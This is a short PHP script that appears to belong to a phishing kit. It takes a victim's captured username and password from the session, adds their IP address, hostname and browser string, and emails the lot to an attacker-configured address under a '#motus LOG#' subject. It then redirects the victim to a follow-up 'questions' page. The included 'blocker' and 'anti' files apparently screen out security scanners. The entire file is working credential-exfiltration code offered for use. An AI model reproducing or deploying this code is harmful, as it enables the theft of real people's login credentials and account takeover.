<?php
session_start();
include "youremail.php";
include('blocker.php');
include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';

$user = $_SESSION['user'];
$pass = $_SESSION['password'];



if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass

Ip: $ip,$browser
Host: $hostname
=======M0TU$ by LOG$=========";
 if ($_SESSION['user'] != "" && $_SESSION['password'] != "" && strlen($user)< 20) {
 $subj = "#motus LOG# $ip $user $pass";



mail($to,$subj,$data);

}



header("Location: questions.php");

?>